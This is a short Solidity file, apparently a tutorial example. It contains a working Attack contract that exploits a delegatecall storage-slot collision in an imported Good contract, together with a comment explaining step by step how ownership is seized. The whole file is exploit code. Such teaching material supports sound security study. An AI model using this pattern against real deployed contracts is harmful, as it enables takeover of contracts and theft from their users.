//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Good.sol";

contract Attack {
    address public helper;
    address public owner;
    uint public num;

    Good public good;

    constructor(Good _good) {
        good = Good(_good);
    }

    function setNum(uint _num) public {
        owner = msg.sender;
    }

    function attack() public {
        good.setNum(uint(uint160(address(this))));
        good.setNum(1);
    }
}

/*
      * What's happening here? Step by Step Explanation:

      * 1. When we call the attack function on this contract, 
      * it will call the setNum function on the Good.sol contract, which in return
      * calls the setNum function on the Helper.sol contract. Now whats the problem here?
      * We are calling the setNum function on the Good.sol contract with the address of 
      * Attack.sol contract typecasted as uint. As as result, the address of the Attack contract
      * will be passed to the Good contract and it will set the address of the Attack contract
      * at slot 0, which happens to be ADDRESS PUBLIC HELPER in the Good contract

      * 2. Now the Attack contract again calls the setNum function on the good contract with 1
      * as a parameter. Since the address of the helper contract in the Good.sol has been changed
      * to the Attack contract's address, it will now delegatecall the setNum function on the Attack
      * contract. This setNum function on  the attack contract makes owner = msg.sender. Meaning the slot 1
      * on the Good contract will be changed to the address of the msg.sender
   */